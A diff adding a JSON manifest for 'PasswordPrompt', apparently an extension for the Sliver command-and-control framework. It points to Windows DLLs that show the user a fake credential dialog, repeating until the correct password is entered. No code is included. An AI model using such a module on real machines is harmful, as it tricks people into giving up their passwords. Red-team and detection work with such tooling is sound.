@@ -1,0 +1,22 @@
+{
+    "name": "PasswordPrompt",
+    "command_name": "PasswordPrompt",
+    "version": "0.0.1",
+    "extension_author": "dominicbreuker",
+    "original_author": "dominicbreuker",
+    "repo_url": "https://github.com/dominicbreuker/SliverSamples/PasswordPromptExtension",
+    "help": "Shows a dialog box asking the user for credentials. Repeats until the correct password is entered. Pass as argument the max. number of times to ask.",
+    "entrypoint": "Execute",
+    "files": [
+        {
+            "os": "windows",
+            "arch": "386",
+            "path": "PasswordPromptExtension.x86.dll"
+        },
+        {
+            "os": "windows",
+            "arch": "amd64",
+            "path": "PasswordPromptExtension.x64.dll"
+        }
+    ]
+}
